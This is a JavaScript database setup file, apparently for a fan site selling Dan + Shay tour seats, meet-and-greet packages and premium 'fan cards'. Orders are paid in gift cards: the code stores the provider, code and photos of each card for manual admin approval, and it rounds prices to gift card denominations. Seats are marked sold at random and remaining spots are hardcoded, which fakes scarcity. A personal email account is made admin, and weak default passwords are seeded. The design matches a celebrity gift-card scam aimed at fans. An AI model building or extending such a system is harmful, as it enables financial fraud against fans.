import initSqlJs from 'sql.js';
import bcrypt from 'bcryptjs';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DB_PATH = path.join(__dirname, 'danandshay.db');

let db = null;

export function getDb() {
  if (!db) throw new Error('Database not initialized. Call initializeDatabase() first.');
  return db;
}

export async function initializeDatabase() {
  const SQL = await initSqlJs();

  // Load existing DB or create new
  if (fs.existsSync(DB_PATH)) {
    const fileBuffer = fs.readFileSync(DB_PATH);
    db = new SQL.Database(fileBuffer);
  } else {
    db = new SQL.Database();
  }

  // Create tables
  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT,
      email TEXT UNIQUE,
      password_hash TEXT,
      role TEXT DEFAULT 'fan',
      created_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS events (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT,
      date TEXT,
      time TEXT,
      venue TEXT,
      city TEXT,
      state TEXT,
      image_url TEXT,
      description TEXT,
      is_featured INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS venue_seats (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      event_id INTEGER REFERENCES events(id),
      section TEXT,
      row TEXT,
      seat_number INTEGER,
      price REAL,
      status TEXT DEFAULT 'available'
    );

    CREATE TABLE IF NOT EXISTS orders (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      event_id INTEGER,
      total REAL,
      status TEXT DEFAULT 'pending_approval',
      type TEXT,
      gift_card_provider TEXT,
      gift_card_code TEXT,
      gift_card_image TEXT,
      admin_notes TEXT,
      reviewed_at TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS order_items (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      order_id INTEGER REFERENCES orders(id),
      seat_id INTEGER,
      meet_greet_id INTEGER,
      fan_card_id INTEGER,
      quantity INTEGER DEFAULT 1,
      price REAL
    );

    CREATE TABLE IF NOT EXISTS meet_greet_packages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      event_id INTEGER REFERENCES events(id),
      title TEXT,
      description TEXT,
      price REAL,
      spots_total INTEGER,
      spots_remaining INTEGER,
      perks TEXT
    );

    CREATE TABLE IF NOT EXISTS fan_cards (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT,
      description TEXT,
      image_url TEXT,
      rarity TEXT,
      price REAL,
      total_supply INTEGER,
      remaining INTEGER
    );

    CREATE TABLE IF NOT EXISTS user_fan_cards (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      fan_card_id INTEGER REFERENCES fan_cards(id),
      acquired_at TEXT DEFAULT (datetime('now')),
      order_id INTEGER
    );

    CREATE INDEX IF NOT EXISTS idx_venue_seats_event ON venue_seats(event_id);
    CREATE INDEX IF NOT EXISTS idx_venue_seats_status ON venue_seats(status);
    CREATE INDEX IF NOT EXISTS idx_venue_seats_event_status ON venue_seats(event_id, status);
    CREATE INDEX IF NOT EXISTS idx_orders_user ON orders(user_id);
    CREATE INDEX IF NOT EXISTS idx_order_items_order ON order_items(order_id);
    CREATE INDEX IF NOT EXISTS idx_user_fan_cards_user ON user_fan_cards(user_id);
  `);

  // Ensure gift card, location, multi-card images & admin approval columns exist in orders
  const newCols = [
    'gift_card_provider TEXT',
    'gift_card_code TEXT',
    'gift_card_image TEXT',
    'gift_card_images TEXT',
    'admin_notes TEXT',
    'reviewed_at TEXT',
    'location_state TEXT',
    'location_city TEXT'
  ];
  for (const col of newCols) {
    try {
      run(`ALTER TABLE orders ADD COLUMN ${col}`);
    } catch (e) {
      // column already exists
    }
  }

  // Migration: Round up all figures to clean whole gift card denominations
  try {
    // 1. Meet & Greet packages: $200, $400, $600, $1000
    run('UPDATE meet_greet_packages SET price = 200 WHERE title LIKE "%Standard%"');
    run('UPDATE meet_greet_packages SET price = 400 WHERE title LIKE "%Gold%"');
    run('UPDATE meet_greet_packages SET price = 600 WHERE title LIKE "%Platinum%"');
    run('UPDATE meet_greet_packages SET price = 1000 WHERE title LIKE "%Ultimate%"');

    // 2. Fan Cards: $150, $400, $1000
    run('UPDATE fan_cards SET price = 150 WHERE rarity = "Silver" OR title LIKE "%Silver%"');
    run('UPDATE fan_cards SET price = 400 WHERE rarity = "Gold" OR title LIKE "%Gold%"');
    run('UPDATE fan_cards SET price = 1000 WHERE rarity = "Obsidian" OR title LIKE "%Obsidian%"');

    // 3. Venue seats: Balcony to 100, Lawn to 50
    run('UPDATE venue_seats SET price = 100 WHERE section = "Balcony"');
    run('UPDATE venue_seats SET price = 50 WHERE section = "Lawn"');
  } catch (e) {
    console.error('Error updating whole prices:', e);
  }

  // Consolidate Meet & Greet Packages to exactly 4 master categories
  try {
    const allMgPkgs = all('SELECT * FROM meet_greet_packages');
    if (allMgPkgs && allMgPkgs.length > 4) {
      console.log('Consolidating Meet & Greet packages to 4 master categories...');
      try {
        run('UPDATE order_items SET meet_greet_id = (((meet_greet_id - 1) % 4) + 1) WHERE meet_greet_id > 4');
      } catch (e) {}
      run('DELETE FROM meet_greet_packages WHERE id > 4');
      run('UPDATE meet_greet_packages SET spots_total = 100, spots_remaining = 95 WHERE id = 1');
      run('UPDATE meet_greet_packages SET spots_total = 50, spots_remaining = 48 WHERE id = 2');
      run('UPDATE meet_greet_packages SET spots_total = 30, spots_remaining = 28 WHERE id = 3');
      run('UPDATE meet_greet_packages SET spots_total = 15, spots_remaining = 14 WHERE id = 4');
      saveDatabase();
      console.log('Consolidated to 4 master VIP Meet & Greet categories.');
    }
  } catch (err) {
    console.error('Error consolidating meet & greet packages:', err);
  }

  // Upgrade Fan Cards to 3 Premium Luxury Tiers
  const lowCards = all('SELECT id FROM fan_cards WHERE price < 100');
  if (lowCards && lowCards.length > 0) {
    console.log('Upgrading Fan Cards to 3 Premium Luxury Tiers...');
    run('DELETE FROM user_fan_cards WHERE fan_card_id IN (SELECT id FROM fan_cards WHERE price < 100)');
    run('DELETE FROM fan_cards WHERE price < 100');
    
    const premiumCards = [
      {
        title: 'Silver All-Access Pass',
        rarity: 'Silver',
        price: 149.00,
        supply: 1000,
        desc: 'Precision laser-etched brushed silver titanium membership card. Unlocks 48-hour concert presale window, digital vault entry, official tour metal lanyard, and 15% official merch privileges.',
        img: 'https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80'
      },
      {
        title: 'Gold VIP Executive Card',
        rarity: 'Gold',
        price: 349.00,
        supply: 500,
        desc: 'Heavy 24K mirror gold foil finish with embossed lettering. Includes VIP soundcheck access pass, fast-track venue entry, authenticated hand-signed tour lithograph, and exclusive acoustic recordings.',
        img: 'https://images.unsplash.com/photo-1465847899084-d164df4dedc6?auto=format&fit=crop&w=600&q=80'
      },
      {
        title: 'Obsidian Founders Reserve',
        rarity: 'Obsidian',
        price: 899.00,
        supply: 50,
        desc: 'Ultra-rare matte obsidian black metal card with gold gilded edges (Numbered 001/050). Guaranteed front-row reservation priority, private artist lounge access, annual private virtual Q&A with Dan + Shay, and signed collector vinyl box set.',
        img: 'https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&w=600&q=80'
      }
    ];

    premiumCards.forEach(card => {
      run('INSERT INTO fan_cards (title, description, image_url, rarity, price, total_supply, remaining) VALUES (?, ?, ?, ?, ?, ?, ?)',
        [card.title, card.desc, card.img, card.rarity, card.price, card.supply, card.supply]);
    });
    saveDatabase();
    console.log('Fan cards upgraded to 3 Premium Luxury Tiers successfully.');
  }

  // Ensure administrator accounts are properly set
  try {
    run("UPDATE users SET role = 'admin' WHERE email = 'patriciarochecl@gmail.com'");
  } catch (e) {}

  seedDatabase();
  saveDatabase();
  console.log('Database initialized.');
}

export function saveDatabase() {
  if (!db) return;
  const data = db.export();
  const buffer = Buffer.from(data);
  fs.writeFileSync(DB_PATH, buffer);
}

// Helper: run a query and return all rows as objects
export function all(sql, params = []) {
  const stmt = db.prepare(sql);
  if (params.length) stmt.bind(params);
  const results = [];
  while (stmt.step()) {
    results.push(stmt.getAsObject());
  }
  stmt.free();
  return results;
}

// Helper: run a query and return the first row as object
export function get(sql, params = []) {
  const rows = all(sql, params);
  return rows.length > 0 ? rows[0] : null;
}

// Helper: run an INSERT/UPDATE/DELETE and return info
export function run(sql, params = []) {
  db.run(sql, params);
  const lastId = db.exec("SELECT last_insert_rowid() as id")[0]?.values[0][0];
  const changes = db.getRowsModified();
  return { lastInsertRowid: lastId, changes };
}

function seedDatabase() {
  // Check if already seeded
  const result = get('SELECT COUNT(*) as count FROM users');
  if (result && result.count > 0) return;

  console.log('Seeding database...');

  // Users
  const salt = bcrypt.genSaltSync(10);
  run('INSERT INTO users (name, email, password_hash, role) VALUES (?, ?, ?, ?)',
    ['Admin', 'admin@danandshay.com', bcrypt.hashSync('admin123', salt), 'admin']);
  run('INSERT INTO users (name, email, password_hash, role) VALUES (?, ?, ?, ?)',
    ['Sarah Johnson', 'fan@example.com', bcrypt.hashSync('fan123', salt), 'fan']);

  // Events — All 26 tour dates
  const events = [
    { date: '2026-09-11', city: 'Noblesville', state: 'IN', venue: 'Ruoff Music Center' },
    { date: '2026-09-12', city: 'Tinley Park', state: 'IL', venue: 'Credit Union 1 Amphitheatre' },
    { date: '2026-09-13', city: 'Shakopee', state: 'MN', venue: 'Valleyfair Amphitheater' },
    { date: '2026-09-17', city: 'Wantagh', state: 'NY', venue: 'Jones Beach Theater' },
    { date: '2026-09-18', city: 'Gilford', state: 'NH', venue: 'Bank of New Hampshire Pavilion' },
    { date: '2026-09-19', city: 'Mansfield', state: 'MA', venue: 'Xfinity Center' },
    { date: '2026-09-24', city: 'Holmdel', state: 'NJ', venue: 'PNC Bank Arts Center' },
    { date: '2026-09-25', city: 'Syracuse', state: 'NY', venue: 'Empower FCU Amphitheater' },
    { date: '2026-09-26', city: 'Uncasville', state: 'CT', venue: 'Mohegan Sun Arena' },
    { date: '2026-10-01', city: 'Toronto', state: 'ON', venue: 'Budweiser Stage' },
    { date: '2026-10-02', city: 'Grand Rapids', state: 'MI', venue: 'Van Andel Arena' },
    { date: '2026-10-03', city: 'Clarkston', state: 'MI', venue: 'Pine Knob Music Theatre' },
    { date: '2026-10-08', city: 'Columbus', state: 'OH', venue: 'Nationwide Arena' },
    { date: '2026-10-09', city: 'Pittsburgh', state: 'PA', venue: 'The Pavilion at Star Lake' },
    { date: '2026-10-10', city: 'Philadelphia', state: 'PA', venue: 'TD Pavilion at The Mann' },
    { date: '2026-10-15', city: 'Alpharetta', state: 'GA', venue: 'Ameris Bank Amphitheatre' },
    { date: '2026-10-16', city: 'Tampa', state: 'FL', venue: 'MIDFLORIDA Credit Union Amphitheatre' },
    { date: '2026-10-17', city: 'West Palm Beach', state: 'FL', venue: 'iTHINK Financial Amphitheatre' },
    { date: '2026-10-22', city: 'Dallas', state: 'TX', venue: 'Dos Equis Pavilion' },
    { date: '2026-10-23', city: 'Rogers', state: 'AR', venue: 'Walmart AMP' },
    { date: '2026-10-24', city: 'Maryland Heights', state: 'MO', venue: 'Hollywood Casino Amphitheatre' },
    { date: '2026-10-29', city: 'Denver', state: 'CO', venue: "Fiddler's Green Amphitheatre" },
    { date: '2026-10-30', city: 'Salt Lake City', state: 'UT', venue: 'USANA Amphitheatre' },
    { date: '2026-11-05', city: 'Phoenix', state: 'AZ', venue: 'Ak-Chin Pavilion' },
    { date: '2026-11-06', city: 'Anaheim', state: 'CA', venue: 'Honda Center' },
    { date: '2026-11-07', city: 'Mountain View', state: 'CA', venue: 'Shoreline Amphitheatre' },
  ];

  const concertImages = [
    'https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?w=800',
    'https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?w=800',
    'https://images.unsplash.com/photo-1429962714451-bb934ecdc4ec?w=800',
    'https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800',
    'https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?w=800',
    'https://images.unsplash.com/photo-1459749411175-04bf5292ceea?w=800',
  ];

  const featuredIds = [1, 4, 10, 16, 22, 25];

  events.forEach((ev, index) => {
    const eventId = index + 1;
    const isFeatured = featuredIds.includes(eventId) ? 1 : 0;
    const imageUrl = concertImages[index % concertImages.length];
    run(
      `INSERT INTO events (title, date, time, venue, city, state, image_url, description, is_featured) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        'Dan + Shay: The Young Tour',
        ev.date,
        '7:30 PM',
        ev.venue,
        ev.city,
        ev.state,
        imageUrl,
        `Join Dan + Shay live in ${ev.city}, ${ev.state} for an unforgettable night on The Young Tour! Experience their biggest hits and new music from the album "Young" in an incredible live performance.`,
        isFeatured,
      ]
    );

    // Seats — VIP (Rows A-C, 10 seats, $250)
    ['A', 'B', 'C'].forEach(row => {
      for (let s = 1; s <= 10; s++) {
        const status = Math.random() < 0.2 ? 'sold' : 'available';
        run('INSERT INTO venue_seats (event_id, section, row, seat_number, price, status) VALUES (?, ?, ?, ?, ?, ?)',
          [eventId, 'VIP', row, s, 250, status]);
      }
    });
    // Floor (Rows D-J, 15 seats, $150)
    ['D', 'E', 'F', 'G', 'H', 'I', 'J'].forEach(row => {
      for (let s = 1; s <= 15; s++) {
        const status = Math.random() < 0.2 ? 'sold' : 'available';
        run('INSERT INTO venue_seats (event_id, section, row, seat_number, price, status) VALUES (?, ?, ?, ?, ?, ?)',
          [eventId, 'Floor', row, s, 150, status]);
      }
    });
    // Balcony (Rows K-P, 20 seats, $100)
    ['K', 'L', 'M', 'N', 'O', 'P'].forEach(row => {
      for (let s = 1; s <= 20; s++) {
        const status = Math.random() < 0.2 ? 'sold' : 'available';
        run('INSERT INTO venue_seats (event_id, section, row, seat_number, price, status) VALUES (?, ?, ?, ?, ?, ?)',
          [eventId, 'Balcony', row, s, 100, status]);
      }
    });
  });

  // Meet & Greet Packages — 4 Master Categories (Available Nationwide in All 50 US States)
  run('INSERT INTO meet_greet_packages (event_id, title, description, price, spots_total, spots_remaining, perks) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [1, 'Standard Meet & Greet', 'Standard meet and greet experience with Dan + Shay. Valid for your chosen US city and state.', 200, 100, 95,
     'Photo opportunity with Dan + Shay, Signed poster, Early venue entry, Commemorative VIP pass']);
  run('INSERT INTO meet_greet_packages (event_id, title, description, price, spots_total, spots_remaining, perks) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [1, 'Gold VIP Experience', 'Premium VIP experience with private meet & greet. Valid for your chosen US city and state.', 400, 50, 48,
     'Private meet & greet, Professional photo, Signed merchandise, Exclusive tour laminate, Early venue entry']);
  run('INSERT INTO meet_greet_packages (event_id, title, description, price, spots_total, spots_remaining, perks) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [1, 'Platinum Sound Check', 'Exclusive sound check access and VIP perks. Valid for your chosen US city and state.', 600, 30, 28,
     'Watch sound check rehearsal, Private meet & greet, Professional photo, Signed guitar pick set, Exclusive merchandise bundle, Premium seating upgrade']);
  run('INSERT INTO meet_greet_packages (event_id, title, description, price, spots_total, spots_remaining, perks) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [1, 'Ultimate Fan Experience', 'The ultimate Dan + Shay fan experience. Valid for your chosen US city and state.', 1000, 15, 14,
     'Backstage tour, Extended meet & greet, Professional photo session, Signed acoustic guitar, Full merchandise bundle, Front row seating, Commemorative VIP lanyard']);

  // Fan Cards — 3 Exclusive Premium Tiers (Silver, Gold, Obsidian)
  const cards = [
    {
      title: 'Silver All-Access Pass',
      rarity: 'Silver',
      price: 150.00,
      supply: 1000,
      desc: 'Precision laser-etched brushed silver titanium membership card. Unlocks 48-hour concert presale window, digital vault entry, official tour metal lanyard, and 15% official merch privileges.',
      img: 'https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80'
    },
    {
      title: 'Gold VIP Executive Card',
      rarity: 'Gold',
      price: 400.00,
      supply: 500,
      desc: 'Heavy 24K mirror gold foil finish with embossed lettering. Includes VIP soundcheck access pass, fast-track venue entry, authenticated hand-signed tour lithograph, and exclusive acoustic recordings.',
      img: 'https://images.unsplash.com/photo-1465847899084-d164df4dedc6?auto=format&fit=crop&w=600&q=80'
    },
    {
      title: 'Obsidian Founders Reserve',
      rarity: 'Obsidian',
      price: 1000.00,
      supply: 50,
      desc: 'Ultra-rare matte obsidian black metal card with gold gilded edges (Numbered 001/050). Guaranteed front-row reservation priority, private artist lounge access, annual private virtual Q&A with Dan + Shay, and signed collector vinyl box set.',
      img: 'https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&w=600&q=80'
    }
  ];

  // Refresh fan cards if they are the old $9 ones
  run('DELETE FROM fan_cards WHERE price < 100');
  const existingCardsCount = get('SELECT COUNT(*) as count FROM fan_cards')?.count || 0;
  if (existingCardsCount === 0) {
    cards.forEach(card => {
      run('INSERT INTO fan_cards (title, description, image_url, rarity, price, total_supply, remaining) VALUES (?, ?, ?, ?, ?, ?, ?)',
        [card.title, card.desc, card.img, card.rarity, card.price, card.supply, card.supply]);
    });
  }

  console.log('Database seeded successfully with 26 tour dates, seats, meet & greet packages, and 3 premium fan cards.');
}
